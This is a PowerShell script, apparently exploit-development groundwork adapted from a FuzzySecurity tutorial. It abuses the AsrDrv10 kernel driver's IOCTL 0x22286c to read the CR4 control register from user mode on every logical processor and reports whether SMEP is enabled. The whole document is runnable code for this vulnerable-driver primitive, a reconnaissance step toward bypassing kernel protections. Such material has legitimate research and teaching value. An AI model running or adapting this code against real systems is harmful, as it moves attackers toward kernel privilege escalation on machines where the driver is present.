# Based of FuzzeySec example code located at https://www.fuzzysecurity.com/tutorials/expDev/23.html
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Driver
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
$hDevice = [Driver]::CreateFile("\\.\AsrDrv10", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
	"Did you load the AsrDrv10 driver?"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\AsrDrv10"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]

# 0x22286c readcr 
# 170678

Function ReadCR {
    param ( $WhichCR )

    $ReadInBuffer = [System.BitConverter]::GetBytes([Int64]$WhichCR)
    $ReadOutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)

    $IntRet = 0
    $CallResult = [Driver]::DeviceIoControl($hDevice, 0x22286c, $ReadInBuffer, $ReadInBuffer.Length, $ReadOutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }

    $CRValue = [System.Runtime.InteropServices.Marshal]::ReadInt64($ReadOutBuffer.ToInt64()+8)

    Return $CRValue
}

[int]$LogicalProcessors = 0 
gwmi -class win32_processor | foreach { $LogicalProcessors += $_.NumberOfLogicalProcessors} 
$maxaffinity = ([math]::pow(2,$LogicalProcessors) - 1) 
 
# check SMEP bit on all logical processors
$core = 0
do
{
    $core | select -unique |  %  {$affinity = 0} {$affinity += [math]::pow(2,$_) }
    (Get-Process -id $pid).ProcessorAffinity = [int]$affinity 

    [Int32]$WhichCR = 0x4
    
    "`nReading CPU{0} CR4..." -f $core
    
    [Int64]$OldCR4 = ReadCR($WhichCR)[-1]
    $SMEPEnabled = [Boolean]($OldCR4 -band (1 -shl 20))
    
    echo "[>] Call result:"
    echo "======================"
    "CPU{0} CR4 = {1:X}" -f $core, $OldCR4
    "CPU{0} CR4.SMEP = {1:X}" -f $core, $SMEPEnabled
    echo "======================"

    $core++
} while ($core -lt $LogicalProcessors)

